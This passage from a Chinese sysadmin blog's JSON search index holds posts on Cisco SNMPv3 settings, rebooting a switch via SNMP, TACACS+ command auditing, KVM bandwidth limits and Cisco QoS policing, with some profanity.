bert\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-l LEVEL              \u003cspan class=\"nb\"\u003eset\u003c/span\u003e security level \u003cspan class=\"o\"\u003e(\u003c/span\u003enoAuthNoPriv\u003cspan class=\"p\"\u003e|\u003c/span\u003eauthNoPriv\u003cspan class=\"p\"\u003e|\u003c/span\u003eauthPriv\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-a PROTOCOL           \u003cspan class=\"nb\"\u003eset\u003c/span\u003e authentication protocol \u003cspan class=\"o\"\u003e(\u003c/span\u003eMD5\u003cspan class=\"p\"\u003e|\u003c/span\u003eSHA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-A PASSPHRASE         \u003cspan class=\"nb\"\u003eset\u003c/span\u003e authentication protocol pass phrase\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-x PROTOCOL           \u003cspan class=\"nb\"\u003eset\u003c/span\u003e privacy protocol \u003cspan class=\"o\"\u003e(\u003c/span\u003eDES\u003cspan class=\"p\"\u003e|\u003c/span\u003eAES\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-X PASSPHRASE         \u003cspan class=\"nb\"\u003eset\u003c/span\u003e privacy protocol pass phrase\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e简单说，v3支持两重加密，要输入两个密码\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmpset -v3 -u Cisco -l authPriv -a MD5 -A FuckCisco -x DES -X zhenbushidongxi 192.168.1.1 .1.3.6.1.4.1.9.2.9.9.0 i \u003cspan class=\"m\"\u003e2\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Cisco snmpv3的设置"},{"content":"这是个什么命题？！没办法，有时候需要用到这种方式\n首先去cisco交换机配置：\nsnmp-server community private RW snmp-server system-shutdown 然后在linux机器上执行：\n# snmpset -v 2c -c private 192.168.1.1 .1.3.6.1.4.1.9.2.9.9.0 i 2 !--- This is an explanation of the variables that this command uses. 10.16.99.55 = ip address of your router private = R/W SNMP Community string of your router .1.3.6.1.4.1.9.2.9.9.0 = tsMsgSend SNMP MIB OID i = Integer as defined SYNTAX in the MIB 2 = reload command as defined in the MIB 最后，Fuck Cisco!!!\n","permalink":"https://rendoumi.com/posts/20240124-cisco_snmp_reboot/","summary":"\u003cp\u003e这是个什么命题？！没办法，有时候需要用到这种方式\u003c/p\u003e\n\u003cp\u003e首先去cisco交换机配置：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmp-server community private RW  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmp-server system-shutdown  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后在linux机器上执行：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# snmpset -v 2c -c private 192.168.1.1 .1.3.6.1.4.1.9.2.9.9.0 i 2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e!--- This is an explanation of the variables that this \u003cspan class=\"nb\"\u003ecommand\u003c/span\u003e uses.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          10.16.99.55 \u003cspan class=\"o\"\u003e=\u003c/span\u003e ip address of your router\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               \u003cspan class=\"nv\"\u003eprivate\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e R/W SNMP Community string of your router\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e.1.3.6.1.4.1.9.2.9.9.0 \u003cspan class=\"o\"\u003e=\u003c/span\u003e tsMsgSend SNMP MIB OID\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                     \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Integer as defined SYNTAX in the MIB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                     \u003cspan class=\"nv\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e reload \u003cspan class=\"nb\"\u003ecommand\u003c/span\u003e as defined in the MIB\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e最后，Fuck Cisco!!!\u003c/p\u003e","title":"Cisco交换机通过snmp来重启"},{"content":"我们用的是Cisco ASR 1001-X这个路由器来做BGP的。\n前两天做多线BGP的时候，也不知道是遇到Bug了，还是操作顺序有问题，大断网，然后重启路由器。\n事后想回顾的时候也是各自有各自的记录，细节语焉不详\u0026hellip;\u0026hellip;\n干脆搭建一个日志服务器来记录下来所有的操作，便于事后复盘\n首先在CentOS 7 的系统上安装TACACS+软件，居然在7上用的是6的软件，这点也很怪异\ncat \u0026lt;\u0026lt; EOF \u0026gt;/etc/yum.repos.d/tacacs-plus.repo [tacacs-plus] name=Tacacs Plus baseurl=http://li.nux.ro/download/nux/misc/el6/x86_64/ enabled=0 gpgcheck=1 gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro EOF 安装tacacs_plus\nyum –enablerepo=tacacs-plus install tac_plus 注意，我们只是用tacacs_plus来记录操作日志，不是用来限制用户登录和权限的，所以只需要关注两行：\nvi /etc/tac_plus.conf key = \u0026#34;FuckFuckFuck\u0026#34; accounting file = /var/log/tac_acct.log ...... 启动，centos 6 没有systemctl，只有service\nservice tac_plus start ok, tacacs+配置好了，继续，去Cisco路由器上配\nRouter1#configure terminal Enter configuration commands, one per line. End with CNTL/Z. Router1(config)#tacacs-server host 192.168.171.13 Router1(config)#tacacs-server timeout 10 Router1(config)#tacacs-server key FuckFuckFuck Router1(config)#aaa new-model Router1(config)#aaa accounting commands 0 default stop-only group tacacs+ Router1(config)#aaa accounting commands 1 default stop-only group tacacs+ Router1(config)#aaa accounting commands 15 default stop-only group tacacs+ Router1(config)#end Router1# “0” 用来审计exit和end命令，这样可以明确知道用户的登录。\n“1” 用来审计非特权用户的show命令。\n“15” 用来审计特权命令对路由器配置的改动。\n看看日志里有没有记录：\n注意，tacacs-server的语法可能在ios版本不同的情况下语法不同：\n# tacacs server TS-AAA address ipv4 192.168.171.13 key FuckFuckFuck timeout 10 ","permalink":"https://rendoumi.com/posts/20240124-cisco_audit/","summary":"\u003cp\u003e我们用的是Cisco ASR 1001-X这个路由器来做BGP的。\u003c/p\u003e\n\u003cp\u003e前两天做多线BGP的时候，也不知道是遇到Bug了，还是操作顺序有问题，大断网，然后重启路由器。\u003c/p\u003e\n\u003cp\u003e事后想回顾的时候也是各自有各自的记录，细节语焉不详\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003e干脆搭建一个日志服务器来记录下来所有的操作，便于事后复盘\u003c/p\u003e\n\u003cp\u003e首先在CentOS 7 的系统上安装TACACS+软件，居然在7上用的是6的软件，这点也很怪异\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;/etc/yum.repos.d/tacacs-plus.repo  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[tacacs-plus]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ename=Tacacs Plus  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ebaseurl=http://li.nux.ro/download/nux/misc/el6/x86_64/  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eenabled=0  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003egpgcheck=1  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003egpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e安装tacacs_plus\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e yum –enablerepo\u003cspan class=\"o\"\u003e=\u003c/span\u003etacacs-plus install tac_plus\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，我们只是用tacacs_plus来记录操作日志，不是用来限制用户登录和权限的，所以只需要关注两行：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/tac_plus.conf  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ekey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;FuckFuckFuck\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccounting \u003cspan class=\"nv\"\u003efile\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /var/log/tac_acct.log  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e启动，centos 6 没有systemctl，只有service\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservice tac_plus start  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eok, tacacs+配置好了，继续，去Cisco路由器上配\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1#configure terminal  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEnter configuration commands, one per line.  End with CNTL/Z.  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#tacacs-server host 192.168.171.13  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#tacacs-server timeout 10  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#tacacs-server key FuckFuckFuck  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#aaa new-model  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#aaa accounting commands 0 default stop-only group tacacs+  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#aaa accounting commands 1 default stop-only group tacacs+  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#aaa accounting commands 15 default stop-only group tacacs+  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#end  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1#  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e“0” 用来审计exit和end命令，这样可以明确知道用户的登录。\u003c/p\u003e","title":"Cisco 路由器的操作审计"},{"content":"需要开一台kvm的测试机，但是需要限制速度，10M\n我们的物理机使用了bridge，以及vlan tag，所以虚机的网卡是br0.141\n查了一圈文档\n\u0026lt;interface type=\u0026#39;bridge\u0026#39;\u0026gt; \u0026lt;mac address=\u0026#39;52:54:00:db:4c:5f\u0026#39;/\u0026gt; \u0026lt;source bridge=\u0026#39;br0.141\u0026#39;/\u0026gt; \u0026lt;bandwidth\u0026gt; \u0026lt;inbound average=\u0026#39;1250\u0026#39; peak=\u0026#39;1250\u0026#39; burst=\u0026#39;1250\u0026#39;/\u0026gt; \u0026lt;outbound average=\u0026#39;1250\u0026#39; peak=\u0026#39;1250\u0026#39; burst=\u0026#39;1250\u0026#39;/\u0026gt; \u0026lt;/bandwidth\u0026gt; \u0026lt;model type=\u0026#39;virtio\u0026#39;/\u0026gt; 注意限速的单位：是kilobyte per second\n那么：\n1250 kilobyte per second, KB/s = 10 Mbps = 1.25 MB/s\n10 Mbps就是通常意义上的网速，/8=1.25 MB/s，就是机器上用下载软件比如迅雷下载，看到的速度（1.25 MB/s）。\n","permalink":"https://rendoumi.com/posts/20240124-kvm_limit_bandwidth/","summary":"\u003cp\u003e需要开一台kvm的测试机，但是需要限制速度，10M\u003c/p\u003e\n\u003cp\u003e我们的物理机使用了bridge，以及vlan tag，所以虚机的网卡是br0.141\u003c/p\u003e\n\u003cp\u003e查了一圈文档\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;interface \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;bridge\u0026#39;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;mac \u003cspan class=\"nv\"\u003eaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;52:54:00:db:4c:5f\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;\u003cspan class=\"nb\"\u003esource\u003c/span\u003e \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;br0.141\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;bandwidth\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;inbound \u003cspan class=\"nv\"\u003eaverage\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1250\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003epeak\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1250\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003eburst\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1250\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;outbound \u003cspan class=\"nv\"\u003eaverage\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1250\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003epeak\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1250\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003eburst\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1250\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;/bandwidth\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;model \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;virtio\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意限速的单位：是kilobyte per second\u003c/p\u003e\n\u003cp\u003e那么：\u003c/p\u003e\n\u003cp\u003e1250 kilobyte per second,  KB/s  = 10 Mbps = 1.25 MB/s\u003c/p\u003e\n\u003cp\u003e10 Mbps就是通常意义上的网速，/8=1.25 MB/s，就是机器上用下载软件比如迅雷下载，看到的速度（1.25 MB/s）。\u003c/p\u003e","title":"KVM的虚机如何限速"},{"content":"诉求很简单，对客户限速，那么麻烦就很多，怎么限？\n先普及一下Cisco的qos知识\n单速单桶： 单速单桶模式不允许流量突发，当用户的流量速率小于配置的CIR时，报文被认为是conform；当用户的流量大于CIR时直接被认为是exceed(思科exceed华为violate)。\n(图中Tc代表桶里令牌的数量，CBS代表令牌桶的容量即Bc)\n如果只配置CIR，不指定Bc，那么默认Bc等于1500bytes或者 CIR数值 / 32 class 100 police 8000 conform-action transmit exceed-action drop class 200 police cir 8000 conform-action transmit exceed-action drop class 300 police 8000 1500 conform-action transmit exceed-action drop class 400 police cir 8000 bc 1500 conform-action transmit exceed-action drop 单速双桶： 支持突发流量，用户的流量会出现三种结果：\n(图中Tc、Te代表桶里令牌的数量，CBS，EBS代表令牌桶的容量即Bc、Be)\n小于或等于CIR（也就是符合CIR） （conform） 大于CIR并小于或等于CIR与Be之和（也就是符合两个桶令牌之和）（exceed） 超过CIR与Be之和（也就是超过两个桶令牌之和）（violate）\n如果只配置CIR、Bc，不指定Be，那么默认Be等于1500bytes或者CIR数值 / 32。 class 500 police 8000 1000 conform-action transmit exceed-action set-prec-transmit 1 violate-action drop class 600 police 8000 1000 1300 conform-action transmit exceed-action set-prec-transmit 1 violate-action drop class 700 police cir 8000 bc 1000 be 1300 conform-action transmit exceed-action set-prec-transmit 1 violate-action drop 双速双桶： (图中Tc、Tp代表桶里令牌的数量，CBS，PBS代表令牌桶的容量即Bc、Be)\nclass 800 police cir 8000 bc 1000 pir 8000 be 1200 conform-action transmit exceed-action transmit violate-action drop 好，罗嗦了这么多。注意，有可能Cisco的交换机不支持最复杂的1rate，three color，所以你就得更换另外两种方式了。\n实战来一下：\npolicy-map LIMIT-50mbit class class-default police cir 50000000 bc 5000000 be 15000000 conform-action transmit exceed-action set-prec-transmit 3 violate-action set-prec-transmit 2 cir为承诺的带宽速率，即需要保证的带宽速率，单位为bps；\nbc为普通突发，单位为bytes；\nbe为最高突发，单位为bytes；\nset-prec-transmit，表示设置IP优先级并转发数据包；\n注意cir和bc、be的单位是不同的，bc和be需要×8，简单算就是×10；\n上面整体命令解释为：承诺带宽50Mbps，普通突发为5Mbytes，最高突发为15Mbytes。当速率小于100Mbps（50+50）是转发数据包，当超过100Mbps小于200Mbps（50+150）是重写IP优先级为3并转发数据包，当超过200Mbps是重写IP优先级为2并转发数据包。\n可以变种一下，超了100兆直接drop\npolice cir 50000000 bc 5000000 be 15000000 conform-action transmit exceed-action drop 最后在端口应用一下策略即可：\ninterface GigabitEthernet1/0/22 description uplink: uplink [50Mbps-200Mbps] switchport access vlan 111 switchport mode access storm-control broadcast level 1.00 storm-control multicast level 5.00 storm-control action shutdown spanning-tree portfast spanning-tree bpdufilter enable spanning-tree bpduguard enable service-policy input LIMIT-50mbit service-policy output LIMIT-50mbit ! ","permalink":"https://rendoumi.com/posts/20240124-cisco_qos/","summary":"\u003cp\u003e诉求很简单，对客户限速，那么麻烦就很多，怎么限？\u003c/p\u003e\n\u003cp\u003e先普及一下Cisco的qos知识\u003c/p\u003e\n\u003ch5 id=\"单速单桶\"\u003e单速单桶：\u003c/h5\u003e\n\u003cp\u003e单速单桶模式不允许流量突发，当用户的流量速率小于配置的CIR时，报文被认为是conform；当用户的流量大于CIR时直接被认为是exceed(思科exceed华为violate)。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240124161128865\" loading=\"lazy\" src=\"/posts/20240124-cisco_qos/image-20240124161128865.png\"\u003e\u003c/p\u003e\n\u003cp\u003e(图中Tc代表桶里令牌的数量，CBS代表令牌桶的容量即Bc)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e如果只配置CIR，不指定Bc，那么默认Bc等于1500bytes或者 CIR数值 / \u003cspan class=\"m\"\u003e32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police \u003cspan class=\"m\"\u003e8000\u003c/span\u003e conform-action transmit  exceed-action drop \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police cir \u003cspan class=\"m\"\u003e8000\u003c/span\u003e conform-action transmit  exceed-action drop \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e300\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police \u003cspan class=\"m\"\u003e8000\u003c/span\u003e \u003cspan class=\"m\"\u003e1500\u003c/span\u003e conform-action transmit  exceed-action drop \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e400\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police cir \u003cspan class=\"m\"\u003e8000\u003c/span\u003e bc \u003cspan class=\"m\"\u003e1500\u003c/span\u003e conform-action transmit  exceed-action drop\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"单速双桶\"\u003e单速双桶：\u003c/h5\u003e\n\u003cp\u003e支持突发流量，用户的流量会出现三种结果：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240124161359401\" loading=\"lazy\" src=\"/posts/20240124-cisco_qos/image-20240124161359401.png\"\u003e\u003c/p\u003e\n\u003cp\u003e(图中Tc、Te代表桶里令牌的数量，CBS，EBS代表令牌桶的容量即Bc、Be)\u003c/p\u003e\n\u003cp\u003e小于或等于CIR（也就是符合CIR） （conform）\n大于CIR并小于或等于CIR与Be之和（也就是符合两个桶令牌之和）（exceed）\n超过CIR与Be之和（也就是超过两个桶令牌之和）（violate）\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e如果只配置CIR、Bc，不指定Be，那么默认Be等于1500bytes或者CIR数值 / 32。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e500\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police \u003cspan class=\"m\"\u003e8000\u003c/span\u003e \u003cspan class=\"m\"\u003e1000\u003c/span\u003e conform-action transmit  exceed-action set-prec-transmit \u003cspan class=\"m\"\u003e1\u003c/span\u003e violate-action drop \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e600\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police \u003cspan class=\"m\"\u003e8000\u003c/span\u003e \u003cspan class=\"m\"\u003e1000\u003c/span\u003e \u003cspan class=\"m\"\u003e1300\u003c/span\u003e conform-action transmit  exceed-action set-prec-transmit \u003cspan class=\"m\"\u003e1\u003c/span\u003e violate-action drop \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e700\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police cir \u003cspan class=\"m\"\u003e8000\u003c/span\u003e bc \u003cspan class=\"m\"\u003e1000\u003c/span\u003e be \u003cspan 